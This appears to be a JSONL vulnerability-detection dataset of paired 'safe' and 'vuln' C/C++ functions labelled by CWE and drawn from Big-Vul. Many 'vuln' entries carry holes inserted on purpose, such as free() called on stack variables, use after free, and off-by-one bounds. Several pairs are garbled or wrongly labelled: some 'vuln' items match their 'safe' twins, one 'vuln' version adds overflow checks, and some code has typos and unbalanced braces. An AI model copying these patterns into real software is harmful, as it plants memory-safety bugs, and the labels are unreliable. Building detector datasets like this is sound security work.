{"idx": "CWE-416-safe-1714408909400", "code": "FilePath FileEnumerator::Next(){++current_directory_entry_;int recursion_depth = 0;while(current_directory_entry_ >= directory_entries_.size()){if(recursion_depth >= MAX_RECURSION_DEPTH || pending_paths_.empty())return FilePath();root_path_=pending_paths_.top();root_path_=root_path_.StripTrailingSeparators();pending_paths_.pop();std::vector<DirectoryEntryInfo>entries;if(!ReadDirectory(&entries, root_path_, file_type_&SHOW_SYM_LINKS))continue;directory_entries_.clear();current_directory_entry_=0;for(std::vector<DirectoryEntryInfo>::const_iterator i=entries.begin();i != entries.end();++i){FilePath full_path=root_path_.Append(i->filename);if(ShouldSkip(full_path))continue;if(pattern_.size() && fnmatch(pattern_.c_str(), full_path.value().c_str(), FNM_NOESCAPE))continue;if(recursive_ && S_ISDIR(i->stat.st_mode))pending_paths_.push(full_path);if((S_ISDIR(i->stat.st_mode) && (file_type_&DIRECTORIES)) || (!S_ISDIR(i->stat.st_mode) && (file_type_&FILES)))directory_entries_.push_back(*i);}++recursion_depth;}return root_path_.Append(directory_entries_[current_directory_entry_].filename);}", "target": 0, "source": "Big-Vul", "source_uid": "123754"}
{"idx": "CWE-416-vuln-1714408909400", "code": "FilePath FileEnumerator::Next(){++current_directory_entry_;int recursion_depth=0;while(current_directory_entry_ >= directory_entries_.size()){if(recursion_depth >= MAX_RECURSION_DEPTH || pending_paths_.empty())return FilePath();root_path_=pending_paths_.top();root_path_=root_path_.StripTrailingSeparators();pending_paths_.pop();std::vector<DirectoryEntryInfo>entries;if(!ReadDirectory(&entries, root_path_, file_type_&SHOW_SYM_LINKS))continue;directory_entries_.clear();current_directory_entry_=0;for(std::vector<DirectoryEntryInfo>::const_iterator i=entries.begin();i != entries.end();++i){FilePath full_path=root_path_.Append(i->filename);if(ShouldSkip(full_path))continue;if(pattern_.size() && fnmatch(pattern_.c_str(), full_path.value().c_str(), FNM_NOESCAPE))continue;if(recursive_ && S_ISDIR(i->stat.st_mode))pending_paths_.push(full_path);if((S_ISDIR(i->stat.st_mode) && (file_type_&DIRECTORIES)) || (!S_ISDIR(i->stat.st_mode) && (file_type_&FILES)))directory_entries_.push_back(*i);}++recursion_depth;}if(current_directory_entry_ < directory_entries_.size())return root_path_.Append(directory_entries_[current_directory_entry_].filename);return FilePath();}", "target": 1, "source": "Big-Vul", "source_uid": "123754"}
{"idx": "CWE-119-safe-1714408933675", "code": "int test_lshift(BIO*bp, BN_CTX*ctx, BIGNUM*a_){BIGNUM*a, *b, *c, *d;int i;b=BN_new();c=BN_new();d=BN_new();BN_one(c);if(a_)a=a_;else{a=BN_new();BN_bntest_rand(a, 200, 0, 0);a->neg=rand_neg();}for(i=0;i<num0;i++){BN_lshift(b, a, i+1);BN_add(c, c, c);if(bp != NULL){if(results && !results){BN_print(bp, a);BIO_puts(bp, \"*\");BN_print(bp, c);BIO_puts(bp, \"-\");}BN_print(bp, b);BIO_puts(bp, \"\\n\");}BN_mul(d, a, c, ctx);BN_sub(d, d, b);if(!BN_is_zero(d)){fprintf(stderr, \"Left shift test failed!\\n\");fprintf(stderr, \"a=\");BN_print_fp(stderr, a);fprintf(stderr, \"\\nb=\");BN_print_fp(stderr, b);fprintf(stderr, \"\\nc=\");BN_print_fp(stderr, c);fprintf(stderr, \"\\nd=\");BN_print_fp(stderr, d);fprintf(stderr, \"\\n\");return 0;}}BN_free(a);BN_free(b);BN_free(c);BN_free(d);return(1);}", "target": 0, "source": "Big-Vul", "source_uid": "3660"}
{"idx": "CWE-119-vuln-1714408933675", "code": "int test_lshift(BIO*bp, BN_CTX*ctx, BIGNUM*a_){BIGNUM*a, *b, *c, *d;int i;b=BN_new();c=BN_new();d=BN_new();BN_one(c);if(a_)a=a_;else{a=BN_new();BN_bntest_rand(a, 200, 0, 0);a->neg=rand_neg();}for(i=0;i<num0;i++){if(i >= a->top) break;BN_lshift(b, a, i+1);BN_add(c, c, c);if(bp != NULL){if(results && !results){BN_print(bp, a);BIO_puts(bp, \"*\");BN_print(bp, c);BIO_puts(bp, \"-\");}BN_print(bp, b);BIO_puts(bp, \"\\n\");}BN_mul(d, a, c, ctx);BN_sub(d, d, b);if(!BN_is_zero(d)){fprintf(stderr, \"Left shift test failed!\\n\");fprintf(stderr, \"a=\");BN_print_fp(stderr, a);fprintf(stderr, \"\\nb=\");BN_print_fp(stderr, b);fprintf(stderr, \"\\nc=\");BN_print_fp(stderr, c);fprintf(stderr, \"\\nd=\");BN_print_fp(stderr, d);fprintf(stderr, \"\\n\");return 0;}}BN_free(a);BN_free(b);BN_free(c);BN_free(d);return(1);}", "target": 1, "source": "Big-Vul", "source_uid": "3660"}
{"idx": "CWE-416-safe-1714408963548", "code": "static void _rpc_pid2jid(slurm_msg_t *msg) {\n    job_id_request_msg_t *req = (job_id_request_msg_t *)msg->data;\n    slurm_msg_t resp_msg;\n    job_id_response_msg_t resp;\n    bool found = false;\n    List steps;\n    ListIterator i;\n    step_loc_t *stepd;\n    steps = stepd_available(conf->spooldir, conf->node_name);\n    i = list_iterator_create(steps);\n    while ((stepd = list_next(i))) {\n        int fd;\n        fd = stepd_connect(stepd->directory, stepd->nodename, stepd->jobid, stepd->stepid, &stepd->protocol_version);\n        if (fd == -1) continue;\n        if (stepd_pid_in_container(fd, stepd->protocol_version, req->job_pid) || req->job_pid == stepd_daemon_pid(fd, stepd->protocol_version)) {\n            slurm_msg_t_copy(&resp_msg, msg);\n            resp.job_id = stepd->jobid;\n            resp.return_code = SLURM_SUCCESS;\n            found = true;\n            close(fd);\n            break;\n        }\n        close(fd);\n    }\n    list_iterator_destroy(i);\n    FREE_NULL_LIST(steps);\n    if (found) {\n        debug3(\"_rpc_pid2jid: pid(%u) found in %u\", req->job_pid, resp.job_id);\n        resp_msg.address = msg->address;\n        resp_msg.msg_type = RESPONSE_JOB_ID;\n        resp_msg.data = &resp;\n        slurm_send_node_msg(msg->conn_fd, &resp_msg);\n    } else {\n        debug3(\"_rpc_pid2jid: pid(%u) not found\", req->job_pid);\n        slurm_send_rc_msg(msg, ESLURM_INVALID_JOB_ID);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "72120"}
{"idx": "CWE-416-vuln-1714408963548", "code": "static void _rpc_pid2jid(slurm_msg_t*msg){job_id_request_msg_t*req=(job_id_request_msg*)msg->data;slurm_msg_t resp_msg;job_id_response_msg_t resp;bool found=false;List steps;ListIterator i;step_loc_t*stepd;steps=stepd_available(conf->spooldir, conf->node_name);i=list_iterator_create(steps);while((stepd=list_next(i))){int fd;fd=stepd_connect(stepd->directory, stepd->nodename, stepd->jobid, stepd->stepid, &stepd->protocol_version);if(fd == -1)continue;if(stepd_pid_in_container(fd, stepd->protocol_version, req->job_pid) || req->job_pid == stepd_daemon_pid(fd, stepd->protocol_version)){slurm_msg_t_copy(&resp_msg, msg);resp.job_id=stepd->jobid;resp.return_code=SLurm_SUCCESS;found=true;close(fd);break;}close(fd);}list_iterator_destroy(i);FREE_NULL_LIST(steps);if(found){debug3(\"_rpc_pid2jid: pid(%u)found in%u\", req->job_pid, resp.job_id);resp_msg.address=msg->address;resp_msg.msg_type=RESPONSE_JOB_ID;resp_msg.data=&resp;slurm_send_node_msg(msg->conn_fd, &resp_msg);}else{debug3(\"_rpc_pid2jid: pid(%u)not found\", req->job_pid);slurm_send_rc_msg(msg, ESLURM_INVALID_JOB_ID);}}}", "target": 1, "source": "Big-Vul", "source_uid": "72120"}
{"idx": "CWE-122-safe-1714408987054", "code": "_asn1_set_value_lv(asn1_node node, const void* value, unsigned int len){int len2;void* temp;if(node == NULL || value == NULL) return node;asn1_length_der(len, NULL, &len2);temp = malloc(len + len2);if(temp == NULL) return NULL;asn1_octet_der(value, len, temp, &len2);return _asn1_set_value_m(node, temp, len2);}", "target": 0, "source": "Big-Vul", "source_uid": "3886"}
{"idx": "CWE-122-vuln-1714408987054", "code": "_asn1_set_value_lv(asn1_node node, const void*value, unsigned int len){int len2;void*temp;if(node == NULL || value == NULL)return node;asn1_length_der(len, NULL, &len2);temp=malloc(len+len2);if(temp == NULL)return NULL;memcpy(temp, value, len);asn1_octet_der(temp, len, temp, &len2);return _asn1_set_value_m(node, temp, len2);}", "target": 1, "source": "Big-Vul", "source_uid": "3886"}
{"idx": "CWE-416-safe-1714408996787", "code": "static bt_status_t btif_in_get_remote_device_properties(bt_bdaddr_t* bd_addr){bt_property_t remote_properties[8];uint32_t num_props=0;bt_bdname_t name, alias;uint32_t cod, devtype;bt_uuid_t remote_uuids[BT_MAX_NUM_UUIDS];memset(remote_properties, 0, sizeof(remote_properties));if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_BDNAME, sizeof(name), &name);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_REMOTE_FRIENDLY_NAME, sizeof(alias), &alias);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_CLASS_OF_DEVICE, sizeof(cod), &cod);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_TYPE_OF_DEVICE, sizeof(devtype), &devtype);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_UUIDS, sizeof(remote_uuids), remote_uuids);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}HAL_CBACK(bt_hal_cbacks, remote_device_properties_cb, BT_STATUS_SUCCESS, bd_addr, num_props, remote_properties);return BT_STATUS_SUCCESS;}", "target": 0, "source": "Big-Vul", "source_uid": "171717"}
{"idx": "CWE-416-vuln-1714408996787", "code": "static bt_status_t btif_in_get_remote_device_properties(bt_bdaddr_t*bd_addr){bt_property_t remote_properties[8];uint32_t num_props=0;bt_bdname_t name, alias;uint32_t cod, devtype;bt_uuid_t remote_uuids[BT_MAX_NUM_UUIDS];memset(remote_properties, 0, sizeof(remote_properties));if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_BDNAME, sizeof(name), &name);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_REMOTE_FRIENDLY_NAME, sizeof(alias), &alias);free(alias);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_CLASS_OF_DEVICE, sizeof(cod), &cod);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_TYPE_OF_DEVICE, sizeof(devtype), &devtype);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}BTIF_STORAGE_FILL_PROPERTY(&remote_properties[num_props], BT_PROPERTY_UUIDS, sizeof(remote_uuids), remote_uuids);if(btif_storage_get_remote_device_property(bd_addr, &remote_properties[num_props])){num_props++;}HAL_CBACK(bt_hal_cbacks, remote_device_properties_cb, BT_STATUS_SUCCESS, bd_addr, num_props, remote_properties);return BT_STATUS_SUCCESS;}", "target": 1, "source": "Big-Vul", "source_uid": "171717"}
{"idx": "CWE-125-safe-1714409019515", "code": "BGD_DECLARE(gdImagePtr)gdImageCropAuto(gdImagePtr im, const unsigned int mode){const int width=gdImageSX(im);const int height=gdImageSY(im);int x, y;int color, match;gdRect crop;crop.x=0;crop.y=0;crop.width=0;crop.height=0;switch(mode){case GD_CROP_TRANSPARENT:color=gdImageGetTransparent(im);break;case GD_CROP_BLACK:color=gdImageColorClosestAlpha(im, 0, 0, 0, 0);break;case GD_CROP_WHITE:color=gdImageColorClosestAlpha(im, 255, 255, 255, 0);break;case GD_CROP_SIDES:gdGuessBackgroundColorFromCorners(im, &color);break;case GD_CROP_DEFAULT:default:color=gdImageGetTransparent(im);break;}match=1;for(y=0;match && y<height;y++){for(x=0;match && x<width;x++){match=(color == gdImageGetPixel(im, x, y));}}if(y >= height-1){return NULL;}crop.y=y-1;match=1;for(y=height-1;match && y >= 0;y--){for(x=0;match && x<width;x++){match=(color == gdImageGetPixel(im, x, y));}}if(y == 0){crop.height=height-crop.y+1;}else{crop.height=y-crop.y+2;}match=1;for(x=0;match && x<width;x++){for(y=0;match && y<crop.y+crop.height-1;y++){match=(color == gdImageGetPixel(im, x, y));}}crop.x=x-1;match=1;for(x=width-1;match && x >= 0;x--){for(y=0;match && y<crop.y+crop.height-1;y++){match=(color == gdImageGetPixel(im, x, y));}}crop.width=x-crop.x+2;return gdImageCrop(im, &crop);}", "target": 0, "source": "Big-Vul", "source_uid": "94740"}
{"idx": "CWE-125-vuln-1714409019515", "code": "BGD_DECLARE(gdImagePtr)gdImageCropAuto(gdImagePtr im, const unsigned int mode){const int width=gdImageSX(im);const int height=gdImageSY(im);int x, y;int color, match;gdRect crop;crop.x=0;crop.y=0;crop.width=0;crop.height=0;switch(mode){case GD_CROP_TRANSPARENT:color=gdImageGetTransparent(im);break;case GD_CROP_BLACK:color=gdImageColorClosestAlpha(im, 0, 0, 0, 0);break;case GD_CROP_WHITE:color=gdImageColorClosestAlpha(im, 255, 255, 255, 0);break;case GD_CROP_SIDES:gdGuessBackgroundColorFromCorners(im, &color);break;case GD_CROP_DEFAULT:default:color=gdImageGetTransparent(im);break;}match=1;for(y=0;match && y<=height;y++){for(x=0;match && x<=width;x++){match=(color == gdImageGetPixel(im, x, y));}}if(y >= height-1){return NULL;}crop.y=y-1;match=1;for(y=height-1;match && y >= 0;y--){for(x=0;match && x<=width;x++){match=(color == gdImageGetPixel(im, x, y));}}if(y == 0){crop.height=height-crop.y+1;}else{crop.height=y-crop.y+2;}match=1;for(x=0;match && x<=width;x++){for(y=0;match && y<=crop.y+crop.height-1;y++){match=(color == gdImageGetPixel(im, x, y));}}crop.x=x-1;match=1;for(x=width-1;match && x >= 0;x--){for(y=0;match && y<=crop.y+crop.height-1;y++){match=(color == gdImageGetPixel(im, x, y));}}crop.width=x-crop.x+2;return gdImageCrop(im, &crop);}", "target": 1, "source": "Big-Vul", "source_uid": "94740"}
{"idx": "CWE-284-safe-1714409041986", "code": "const views::ImageView* icon_view() const { return header_row() ? header_row()->app_icon_for_testing() : nullptr; }", "target": 0, "source": "Big-Vul", "source_uid": "149202"}
{"idx": "CWE-284-vuln-1714409041986", "code": "const views::ImageView*icon_view()const{return header_row? header_row->app_icon_for_testing(): nullptr;}", "target": 1, "source": "Big-Vul", "source_uid": "149202"}
{"idx": "CWE-416-safe-1714409046652", "code": "next_intuit_at(file_offset file_pos, lin file_line){int p_base=file_pos; int p_bline=file_line;}", "target": 0, "source": "Big-Vul", "source_uid": "2690"}
{"idx": "CWE-416-vuln-1714409046652", "code": "next_intuit_at(file_offset file_pos, lin file_line){int p_base=file_pos;free(&p_base);int p_bline=file_line;}", "target": 1, "source": "Big-Vul", "source_uid": "2690"}
{"idx": "CWE-119-safe-1714409057293", "code": "static int ehci_state_advqueue(EHCIQueue*q){\n    if(q == NULL) return 0;\n#if 0 \n    if(I-bit set){ehci_set_state(ehci, async, EST_HORIZONTALQH);goto out;}\n#endif \n    if(((q->qh.token&QTD_TOKEN_TBYTES_MASK) != 0) && (NLPTR_TBIT(q->qh.altnext_qtd) == 0)){q->qtdaddr=q->qh.altnext_qtd;ehci_set_state(q->ehci, q->async, EST_FETCHQTD);}else if(NLPTR_TBIT(q->qh.next_qtd) == 0){q->qtdaddr=q->qh.next_qtd;ehci_set_state(q->ehci, q->async, EST_FETCHQTD);}else{ehci_set_state(q->ehci, q->async, EST_HORIZONTALQH);}return 1;}", "target": 0, "source": "Big-Vul", "source_uid": "5816"}
{"idx": "CWE-119-vuln-1714409057293", "code": "static int ehci_state_advqueue(EHCIQueue*q){if(q == NULL)return 0;#if 0    if(I-bit set){ehci_set_state(ehci, async, EST_HORIZONTALQH);goto out;}#endif    if(((q->qh.token&QTD_TOKEN_TBYTES_MASK) != 0) && (NLPTR_TBIT(q->qh.altnext_qtd) == 0)){q->qtdaddr=q->qh.altnext_qtd;ehci_set_state(q->ehci, q->async, EST_FETCHQTD);}else if(NLPTR_TBIT(q->qh.next_qtd) == 0){q->qtdaddr=q->qh.next_qtd;ehci_set_state(q->ehci, q->async, EST_FETCHQTD);}else{ehci_set_state(q->ehci, q->async, EST_HORIZONTALQH);}return 1;}", "target": 1, "source": "Big-Vul", "source_uid": "5816"}
{"idx": "CWE-834-safe-1714409073055", "code": "V8Console::CommandLineAPIScope::CommandLineAPIScope(v8::Local<v8::Context> context, v8::Local<v8::Object> commandLineAPI, v8::Local<v8::Object> global): m_context(context), m_commandLineAPI(commandLineAPI), m_global(global), m_installedMethods(v8::Set::New(context->GetIsolate())), m_cleanup(false){v8::Local<v8::Array> names;if(!m_commandLineAPI->GetOwnPropertyNames(context).ToLocal(&names))return;v8::Local<v8::External> externalThis=v8::External::New(context->GetIsolate(), this);for(size_t i=0;i<names->Length();++i){v8::Local<v8::Value> name;if(!names->Get(context, i).ToLocal(&name) || !name->IsName())continue;if(m_global->Has(context, name).FromMaybe(true))continue;if(!m_installedMethods->Add(context, name).ToLocal(&m_installedMethods)){m_installedMethods->Delete(context, name);continue;}if(!m_global->SetAccessor(context, v8::Local<v8::Name>::Cast(name), CommandLineAPIScope::accessorGetterCallback, CommandLineAPIScope::accessorSetterCallback, externalThis, v8::DEFAULT, v8::DontEnum).FromMaybe(false)){bool removed=m_installedMethods->Delete(context, name).FromMaybe(false);DCHECK(removed);continue;}}}", "target": 0, "source": "Big-Vul", "source_uid": "141648"}
{"idx": "CWE-834-vuln-1714409073055", "code": "V8Console::CommandLineAPIScope::CommandLineAPIScope(v8::Local<v8::Context> context, v8::Local<v8::Object> commandLineAPI, v8::Local<v8::Object> global): m_context(context), m_commandLineAPI(commandLineAPI), m_global(global), m_installedMethods(v8::Set::New(context->GetIsolate())), m_cleanup(false){v8::Local<v8::Array> names;if(!m_commandLineAPI->GetOwnPropertyNames(context).ToLocal(&names))return;v8::Local<v8::External> externalThis=v8::External::New(context->GetIsolate(), this);for(size_t i=0;i<names->Length();++i){v8::Local<v8::Value> name;if(!names->Get(context, i).ToLocal(&name) || !name->IsName())continue;if(m_global->Has(context, name).FromMaybe(true))continue;if(!m_installedMethods->Add(context, name).ToLocal(&m_installedMethods)){m_installedMethods->Delete(context, name);continue;}if(!m_global->SetAccessor(context, v8::Local<v8::Name>::Cast(name), CommandLineAPIScope::accessorGetterCallback, CommandLineAPIScope::accessorSetterCallback, externalThis, v8::DEFAULT, v8::DontEnum).FromMaybe(false)){bool removed=m_installedMethods->Delete(context, name).FromMaybe(false);DCHECK(removed);continue;}}}", "target": 1, "source": "Big-Vul", "source_uid": "141648"}
{"idx": "CWE-190-safe-1714409098172", "code": "void gdImageFilledPolygon(gdImagePtr im, gdPointPtr p, int n, int c){int i;int y;int miny, maxy, pmaxy;int x1, y1;int x2, y2;int ind1, ind2;int ints;int fill_color;if(n <= 0){return;}if(overflow2(sizeof(int), n)){return;}if(c == gdAntiAliased){fill_color=im->AA_color;}else{fill_color=c;}if(!im->polyAllocated){im->polyInts=(int*)gdMalloc(sizeof(int)*n);im->polyAllocated=n;}if(overflow2(sizeof(int), n) || overflow2(sizeof(int), im->polyAllocated)){return;}if(im->polyAllocated<n){while(im->polyAllocated<n){im->polyAllocated*=2;}if(overflow2(sizeof(int), im->polyAllocated)){return;}im->polyInts=(int*)gdRealloc(im->polyInts, sizeof(int)*im->polyAllocated);}miny=p[0].y;maxy=p[0].y;for(i=1;i<n;i++){if(p[i].y<miny){miny=p[i].y;}if(p[i].y>maxy){maxy=p[i].y;}}pmaxy=maxy;if(miny<0){miny=0;}if(maxy >= gdImageSY(im)){maxy=gdImageSY(im)-1;}for(y=miny;y <= maxy;y++){ints=0;for(i=0;i<n;i++){if(!i){ind1=n-1;ind2=0;}else{ind1=i-1;ind2=i;}y1=p[ind1].y;y2=p[ind2].y;if(y1<y2){x1=p[ind1].x;x2=p[ind2].x;}else if(y1>y2){y2=p[ind1].y;y1=p[ind2].y;x2=p[ind1].x;x1=p[ind2].x;}else{continue;}if(y >= y1 && y<y2){im->polyInts[ints++]=(float)((y-y1)*(x2-x1))/(float)(y2-y1)+0.5+x1;}else if(y == pmaxy && y == y2){im->polyInts[ints++]=x2;}}qsort(im->polyInts, ints, sizeof(int), gdCompareInt);for(i=0;i<ints-1;i+=2){gdImageLine(im, im->polyInts[i], y, im->polyInts[i+1], y, fill_color);}}if(c == gdAntiAliased){gdImagePolygon(im, p, n, c);}}", "target": 0, "source": "Big-Vul", "source_uid": "51438"}
{"idx": "CWE-190-vuln-1714409098172", "code": "void gdImageFilledPolygon(gdImagePtr im, gdPointPtr p, int n, int c){int i;int y;int miny, maxy, pmaxy;int x1, y1;int x2, y2;int ind1, ind2;int ints;int fill_color;if(n <= 0){return;}if(n <= 0 || sizeof(int) > INT_MAX / n){return;}if(c == gdAntiAliased){fill_color=im->AA_color;}else{fill_color=c;}if(!im->polyAllocated){im->polyInts=(int*)gdMalloc(sizeof(int)*n);im->polyAllocated=n;}if(n <= 0 || sizeof(int) > INT_MAX / n || sizeof(int) > INT_MAX / im->polyAllocated){return;}if(im->polyAllocated<n){while(im->polyAllocated<n){if(sizeof(int) > INT_MAX / im->polyAllocated){return;}im->polyAllocated*=2;}if(n <= 0 || sizeof(int) > INT_MAX / im->polyAllocated){return;}im->polyInts=(int*)gdRealloc(im->polyInts, sizeof(int)*im->polyAllocated);}miny=p[0].y;maxy=p[0].y;for(i=1;i<n;i++){if(p[i].y<miny){miny=p[i].y;}if(p[i].y>maxy){maxy=p[i].y;}}pmaxy=maxy;if(miny<0){miny=0;}if(maxy >= gdImageSY(im)){maxy=gdImageSY(im)-1;}for(y=miny;y <= maxy;y++){ints=0;for(i=0;i<n;i++){if(!i){ind1=n-1;ind2=0;}else{ind1=i-1;ind2=i;}y1=p[ind1].y;y2=p[ind2].y;if(y1<y2){x1=p[ind1].x;x2=p[ind2].x;}else if(y1>y2){y2=p[ind1].y;y1=p[ind2].y;x2=p[ind1].x;x1=p[ind2].x;}else{continue;}if(y >= y1 && y<y2){im->polyInts[ints++]=(float)((y-y1)*(x2-x1))/(float)(y2-y1)+0.5+x1;}else if(y == pmaxy && y == y2){im->polyInts[ints++]=x2;}}qsort(im->polyInts, ints, sizeof(int), gdCompareInt);for(i=0;i<ints-1;i+=2){gdImageLine(im, im->polyInts[i], y, im->polyInts[i+1], y, fill_color);}}if(c == gdAntiAliased){gdImagePolygon(im, p, n, c);}}", "target": 1, "source": "Big-Vul", "source_uid": "51438"}
{"idx": "CWE-416-safe-1714409127501", "code": "bool Extension::InitExtensionID(extensions::Manifest* manifest, const FilePath& path, const std::string& explicit_id, int creation_flags, std::string* error){if (!explicit_id.empty()) {manifest->set_extension_id(explicit_id);return true;}if (manifest->HasKey(keys::kPublicKey)) {std::string public_key;std::string public_key_bytes;std::string extension_id;if (!manifest->GetString(keys::kPublicKey, &public_key) || !ParsePEMKeyBytes(public_key, &public_key_bytes) || !GenerateId(public_key_bytes, &extension_id)) {*error = errors::kInvalidKey;return false;}manifest->set_extension_id(extension_id);return true;}if (creation_flags & REQUIRE_KEY) {*error = errors::kInvalidKey;return false;} else {std::string extension_id = GenerateIdForPath(path);if (extension_id.empty()) {NOTREACHED() << \"Could not create ID from path.\";return false;}manifest->set_extension_id(extension_id);return true;}}", "target": 0, "source": "Big-Vul", "source_uid": "122664"}
{"idx": "CWE-416-vuln-1714409127501", "code": "bool Extension::InitExtensionID(extensions::Manifest*manifest, const FilePath&path, const std::string&explicit_id, int creation_flags, std::string*error){if(!explicit_id.empty()){manifest->set_extension_id(explicit_id);return true;}if(manifest->HasKey(keys::kPublicKey)){std::string public_key;std::string public_key_bytes;std::string extension_id;if(!manifest->GetString(keys::kPublicKey, &public_key) || !ParsePEMKeyBytes(public_key, &public_key_bytes) || !GenerateId(public_key_bytes, &extension_id)){*error=errors::kInvalidKey;return false;}free(&extension_id);manifest->set_extension_id(extension_id);return true;}if(creation_flags&REQUIRE_KEY){*error=errors::kInvalidKey;return false;}else{std::string extension_id=GenerateIdForPath(path);if(extension_id.empty()){NOTREACHED()<<\"Could not create ID from path.\";return false;}free(&extension_id);manifest->set_extension_id(extension_id);return true;}}", "target": 1, "source": "Big-Vul", "source_uid": "122664"}
{"idx": "CWE-190-safe-1714409142740", "code": "static opj_pi_iterator_t*opj_pi_create(const opj_image_t*image, const opj_cp_t*cp, OPJ_UINT32 tileno){OPJ_UINT32 pino, compno;OPJ_UINT32 l_poc_bound;opj_pi_iterator_t*l_pi=00;opj_tcp_t*tcp=00;const opj_tccp_t*tccp=00;opj_pi_iterator_t*l_current_pi=00;assert(cp != 00);assert(image != 00);assert(tileno<cp->tw*cp->th);tcp=&cp->tcps[tileno];l_poc_bound=tcp->numpocs+1;l_pi=(opj_pi_iterator_t*)opj_calloc((l_poc_bound), sizeof(opj_pi_iterator_t));if(!l_pi){return NULL;}l_current_pi=l_pi;for(pino=0;pino<l_poc_bound;++pino){l_current_pi->comps=(opj_pi_comp_t*)opj_calloc(image->numcomps, sizeof(opj_pi_comp_t));if(!l_current_pi->comps){opj_pi_destroy(l_pi, l_poc_bound);return NULL;}l_current_pi->numcomps=image->numcomps;for(compno=0;compno<image->numcomps;++compno){opj_pi_comp_t*comp=&l_current_pi->comps[compno];tccp=&tcp->tccps[compno];comp->resolutions=(opj_pi_resolution_t*)opj_calloc(tccp->numresolutions, sizeof(opj_pi_resolution_t));if(!comp->resolutions){opj_pi_destroy(l_pi, l_poc_bound);opj_pi_destroy(l_pi, pino);return 00;}comp->numresolutions=tccp->numresolutions;}++l_current_pi;}return l_pi;}", "target": 0, "source": "Big-Vul", "source_uid": "50046"}
{"idx": "CWE-190-vuln-1714409142740", "code": "static opj_pi_iterator_t*opj_pi_create(const opj_image_t*image, const opj_cp_t*cp, OPJ_UINT32 tileno){OPJ_UINT32 pino, compno;OPJ_UINT32 l_poc_bound;opj_pi_iterator_t*l_pi=00;opj_tcp_t*tcp=00;const opj_tccp_t*tccp=00;opj_pi_iterator_t*l_current_pi=00;assert(cp != 00);assert(image != 00);assert(tileno<cp->tw*cp->th);tcp=&cp->tcps[tileno];l_poc_bound=tcp->numpocs+1;l_pi=(opj_pi_iterator_t*)opj_calloc((l_poc_bound), sizeof(opj_pi_iterator_t));if(!l_pi){return NULL;}l_current_pi=l_pi;for(pino=0;pino<l_poc_bound;++pino){l_current_pi->comps=(opj_pi_comp_t*)opj_calloc(image->numcomps, sizeof(opj_pi_comp_t));if(!l_current_pi->comps){opj_pi_destroy(l_pi, l_poc_bound);return NULL;}l_current_pi->numcomps=image->numcomps;for(compno=0;compno<image->numcomps;++compno){opj_pi_comp_t*comp=&l_current_pi->comps[compno];tccp=&tcp->tccps[compno];comp->resolutions=(opj_pi_resolution_t*)opj_calloc(tccp->numresolutions, sizeof(opj_pi_resolution_t));if(!comp->resolutions){opj_pi_destroy(l_pi, l_poc_bound);opj_pi_destroy(l_pi, pino);return 00;}comp->numresolutions=tccp->numresolutions;}++l_current_pi;}return l_pi;}", "target": 1, "source": "Big-Vul", "source_uid": "50046"}
{"idx": "CWE-416-safe-1714409169631", "code": "srch_nxtprv(int reverse){int result;static int(*routine[2])(Buffer*, char*)={forwardSearch, backwardSearch};if(searchRoutine == NULL){searchRoutine = forwardSearch;disp_message(\"No previous regular expression\", TRUE);return;}if(reverse != 0)reverse=1;if(searchRoutine == backwardSearch)reverse ^=1;if(reverse == 0)Currentbuf->pos+=1;result=srchcore(SearchString, routine[reverse]);if(result&SR_FOUND)clear_mark(Currentbuf->currentLine);else{if(reverse == 0)Currentbuf->pos-=1;}displayBuffer(Currentbuf, B_NORMAL);disp_srchresult(result, (reverse ? \"Backward: \" : \"Forward: \"), SearchString);}", "target": 0, "source": "Big-Vul", "source_uid": "84546"}
{"idx": "CWE-416-vuln-1714409169631", "code": "int srch_nxtprv(int reverse){int result;static int(*routine[2])(Buffer*, char*)={forwardSearch, backwardSearch};if(searchRoutine == NULL){searchRoutine=forwardSearch;disp_message(\"No previous regular expression\", TRUE);return;}if(reverse != 0)reverse=1;if(searchRoutine == backwardSearch)reverse ^=1;if(reverse == 0)Currentbuf->pos+=1;result=srchcore(SearchString, routine[reverse]);free(SearchString);if(result&SR_FOUND)clear_mark(Currentbuf->currentLine);else{if(reverse == 0)Currentbuf->pos-=1;}displayBuffer(Currentbuf, B_NORMAL);disp_srchresult(result, (reverse ? \"Backward: \" : \"Forward: \"), SearchString);}", "target": 1, "source": "Big-Vul", "source_uid": "84546"}
